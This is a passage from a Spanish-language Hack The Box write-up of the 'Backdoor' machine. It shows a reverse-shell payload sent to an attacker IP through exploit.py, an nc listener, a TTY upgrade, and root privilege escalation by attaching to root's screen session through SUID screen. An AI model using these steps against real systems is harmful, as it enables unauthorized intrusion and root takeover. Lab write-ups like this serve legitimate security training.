+Payload size: 106 bytes
+Saved as: rev.bin
+</pre></table></code></div></div><p>Esta reverse shell indica que cuando se ejecute envie una shell a la IP 10.10.14.242 por el puerto 443.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ python3 exploit.py 10.10.11.125:1337 rev.bin
+[+] Connected to target. Preparing exploit
+[+] Found x64 arch
+[+] Sending payload
+[*] Pwned!! Check your listener
+</pre></table></code></div></div><p>Tenemos acceso a la máquina víctima :D</p><h1 id="post-explotación">Post-explotación</h1><p>Ya podriamos leer la flag del usuarios, pero primero haremos funcional la terminal, para que podamos hacer CTRL + C, CTRL + V…</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>❯ nc -nlvp 443 
+listening on [any] 443 ...
+connect to [10.10.14.242] from (UNKNOWN) [10.10.11.125] 41368
+❯ script /dev/null -c bash
+Script started, file is /dev/null
+❯ user@Backdoor:/home/user$ CTRL + Z
+[1]+ Detenido		nc -nlvp 443
+❯ stty raw -echo; fg
+nc -nlvp 443
+	reset
+reset: unknow terminal type unknown
+Terminal type? xterm
+❯ export SHELL=bash
+❯ export TERM=xterm
+❯ stty rows 49 columns 189
+</pre></table></code></div></div><p>Ahora si, leeremos la flag del usuario.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ cat user.txt
+9d44e4692ebdcf2d****************
+</pre></table></code></div></div><p>Empezaremos con una enumeración básica, vamos a ver si pertenecemos a algun grupo interesante:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</pre></table></code></div></div><p>No tenemos nada interesante, podemos empezar a enumerar binarios con permisos SUID.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>❯ find / -perm -u=s 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/screen
+/usr/bin/umount
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/pkexec
+</pre></table></code></div></div><p>Todos estos binarios es normal que tengan permisos SUID, pero recordemos que en la enumeración de procesos descubrimos que se estaba ejecutando el comando <code class="language-plaintext highlighter-rouge">screen</code>. Ese proceso comprobaba cada segundo que un directorio estubiera vacío, de ser este el caso ejecutaba <code class="language-plaintext highlighter-rouge">screen -dmS root</code>.</p><p>Este comando crea con el usuario root una sesión llamada <code class="language-plaintext highlighter-rouge">root</code>, gracias a que hemos enumerado los binarios con permisos SUID sabemos que podemos utilizar el comando <code class="language-plaintext highlighter-rouge">screen</code> como root, por lo tanto podemos acceder a su sesión.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ screen -r root/root
+❯ whoami
+root
+</pre></table></code></div></div><p>Ya podemos leer la flag de root</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ cat root.txt
+fb01c701a89c7223****************
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >Wordpress</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/suid/" class="post-tag no-text-decoration" >SUID</a> <a href="/tags/directory-traversal/" class="post-tag no-text-decoration" >Directory Traversal</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Backdoor+Writeup+-+xDaNN1&url=https%3A%2F%2Fxdann1.github.io%2Fposts%2Fwriteup-backdoor%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Backdoor+Writeup+-+xDaNN1&u=https%3A%2F%2Fxdann1.github.io%2Fposts%2Fwriteup-backdoor%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fxdann1.github.io%2Fposts%2Fwriteup-backdoor%2F&text=Backdoor+Writeup+-+xDaNN1" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fxdann1.github.io%2Fposts%2Fwriteup-backdoor%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/inyecciones-sql/">Inyecciones SQL</a><li><a href="/posts/oscp-review/">OSCP Review</a><li><a href="/posts/crto-review/">CRTO Review</a><li><a href="/posts/writeup-sizzle/">Sizzle Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/certificaci%C3%B3n/">Certificación</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/pentesting/">Pentesting</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-paper/"><div class="card-body"> <em class="timeago small" data-ts="1655503200" > 2022-06-18 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Paper Writeup</h3><div class="text-muted small"><p> Máquina Easy, nos aprovechamos de un filtrado de información para acceder a un subdominio el cual tiene una vulnerabilidad que nos permite ver información oculta, conseguimos autenticarnos contra u...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-goodgames/"><div class="card-body"> <em class="timeago small" data-ts="1661724000" > 2022-08-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GoodGames Writeup</h3><div class="text-muted small"><p> Máquina Easy, nos aprovechamos de una inyección SQL para saltarnos el panel de login, convirtiendonos en el usuario administrador de la página, encontramos un subdominio y metemos en él unas creden...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-pandora/"><div class="card-body"> <em class="timeago small" data-ts="1653948000" > 2022-05-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pandora Writeup</h3><div class="text-muted small"><p> Máquina Easy, encontramos un puerto abierto en UDP que corre una versión sin casi seguridad, lo enumeramos hasta encontrar unas credenciales válidas para ssh, encontramos una web oculta vulnerable ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/writeup-steamcloud/" class="btn btn-outline-primary" prompt="Anterior"><p>SteamCloud Writeup</p></a> <a href="/posts/writeup-unicode/" class="btn btn-outline-primary" prompt="Nuevo"><p>Unicode Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/xdann1">xdann1</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/sqli/">SQLi</a> <a class="post-tag" href="/tags/certificaci%C3%B3n/">Certificación</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/pentesting/">Pentesting</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/crackeo-contrase%C3%B1as/">Crackeo Contraseñas</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
